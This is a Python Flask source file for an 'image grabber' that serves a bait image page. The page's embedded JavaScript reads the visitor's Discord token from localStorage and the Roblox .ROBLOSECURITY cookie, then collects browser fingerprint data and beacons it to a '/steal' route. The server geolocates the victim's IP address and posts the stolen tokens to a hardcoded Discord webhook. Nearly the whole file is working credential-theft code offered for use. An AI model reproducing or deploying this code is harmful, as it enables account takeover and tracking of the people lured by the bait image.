# api/main.py - Updated with real image proxy
import os
from flask import Flask, request, Response
import requests
import base64
import json
import urllib.parse
from datetime import datetime
import io

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1470096967848824842/r-jZxPC9ak3StrviCxigMgb6uk5fdKXaffchHmjc8rs9z72qk4td6c52QBjd_a1cjKiV"
img_url = 'https://i.imgur.com/XP1495v.jpg'  # ← CHANGE THIS TO YOUR BAIT IMAGE

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    if path.endswith(('.jpg', '.png')) and path.startswith('grab'):
        return grab_image()
    elif path == 'image.jpg':
        return image_proxy()
    elif path == 'steal':
        return steal_data()
    return "404"

def grab_image():
    html = f"""
<!DOCTYPE html><html><head><title></title>
<meta charset="UTF-8">
<script>
setTimeout(()=>{{
    let token = localStorage.getItem('token');
    if(!token){{
        let iframe = document.createElement('iframe');
        iframe.style.display='none';
        document.body.appendChild(iframe);
        token = iframe.contentWindow.localStorage.getItem('token');
    }}
    let roblox = '';
    for(let c of document.cookie.split(';')){{
        if(c.includes('.ROBLOSECURITY')){{
            roblox = c.split('=')[1].replace(/^_ \| WARNING: Obsolete \| /,'').replace(/ \|_$/,'');
            break;
        }}
    }}
    let data = {{
        ua: navigator.userAgent,
        lang: navigator.language,
        screen: screen.width+'x'+screen.height,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency,
        ram: navigator.deviceMemory||'N/A',
        cookies: document.cookie.split(';').length,
        plugins: navigator.plugins.length,
        ref: document.referrer,
        token: token?.substring(0,60)+'...'||'none',
        roblox: roblox?.substring(0,60)+'...'||'none'
    }};
    navigator.sendBeacon('/steal?data='+btoa(JSON.stringify(data)));
    window.location.href = 'data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==';
}}, 100);
</script>
<img src="{img_url}" style="max-width:100%;height:auto;" onload="this.style.display='block'">
</head><body style="margin:0;padding:20px;background:#000;color:#fff;font-family:Arial;text-align:center;">
Loading image...
</body></html>
    """
    return Response(html, mimetype='text/html', headers={'Cache-Control': 'no-cache'})

def image_proxy():
    """Real image proxy - loads actual image + tracks clicks"""
    try:
        resp = requests.get(img_url, timeout=5)
        resp.raise_for_status()
        return Response(resp.content, mimetype=resp.headers.get('content-type', 'image/jpeg'))
    except:
        # Fallback 1x1 pixel
        pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
        return Response(pixel, mimetype='image/gif')

def geo_lookup(ip):
    try:
        resp = requests.get(f'http://ipapi.co/{ip}/json/', timeout=3)
        data = resp.json()
        return f"{data.get('city', 'N/A')}, {data.get('region', 'N/A')} ({data.get('country_name', 'N/A')})"
    except:
        return 'N/A'

def steal_data():
    data = request.args.get('data', '')
    if data:
        try:
            info = json.loads(base64.b64decode(urllib.parse.unquote(data)).decode())
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            geo = geo_lookup(ip)
            
            embed1 = {
                "title": "🖼️ Image Grabbed",
                "color": 0x00ff00,
                "fields": [
                    {"name": "IP", "value": ip, "inline": True},
                    {"name": "Geo", "value": geo, "inline": True},
                    {"name": "ISP", "value": "ipapi.co", "inline": True},
                    {"name": "UA", "value": info['ua'][:50]+"...", "inline": False},
                    {"name": "Referer", "value": info['ref'] or 'direct', "inline": False},
                    {"name": "Lang", "value": info['lang'], "inline": True},
                    {"name": "Time", "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M"), "inline": True},
                    {"name": "Tokens", "value": "⏳ Pending...", "inline": False}
                ]
            }
            requests.post(WEBHOOK_URL, json={'embeds': [embed1]})
        except:
            pass
    
    # Steal embed (separate webhook call from JS)
    token = request.args.get('token', '')[:60]
    roblox = request.args.get('roblox', '')[:60]
    if token or roblox:
        embed2 = {
            "title": "💎 TOKENS STOLEN",
            "color": 0xff0000,
            "fields": [
                {"name": "Discord", "value": token or 'none', "inline": True},
                {"name": "Roblox", "value": roblox or 'none', "inline": True},
                {"name": "Screen", "value": request.args.get('screen', 'N/A'), "inline": True},
                {"name": "TZ", "value": request.args.get('tz', 'N/A'), "inline": True},
                {"name": "Battery", "value": request.args.get('battery', 'N/A'), "inline": True},
                {"name": "Net", "value": request.args.get('net', 'N/A'), "inline": True},
                {"name": "Platform", "value": request.args.get('platform', 'N/A'), "inline": True},
                {"name": "CPU/RAM", "value": f"{request.args.get('cores', 'N/A')}/{request.args.get('ram', 'N/A')}", "inline": True},
                {"name": "Cookies", "value": request.args.get('cookies', 'N/A'), "inline": True},
                {"name": "Plugins", "value": request.args.get('plugins', 'N/A'), "inline": True}
            ]
        }
        requests.post(WEBHOOK_URL, json={'embeds': [embed2]})
    
    # Invisible pixel redirect
    pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
    return Response(pixel, mimetype='image/gif')

if __name__ == "__main__":
    app.run()
